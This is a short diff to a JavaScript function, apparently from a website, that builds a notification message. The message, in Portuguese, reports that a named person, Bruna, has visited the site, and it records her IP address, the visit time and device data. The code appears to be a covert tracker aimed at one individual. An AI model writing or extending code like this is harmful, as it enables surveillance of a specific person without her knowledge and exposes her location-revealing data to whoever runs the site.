@@ -62,7 +62,7 @@ async function sendMessage(ip) {
 
     const device = getDeviceInfo();
 
-    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---;\n\n` +
+    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (pera que to testando antes)\n\n` +
                     `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                     `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                     `🌐 IP (IPv4): ${ip}\n` +
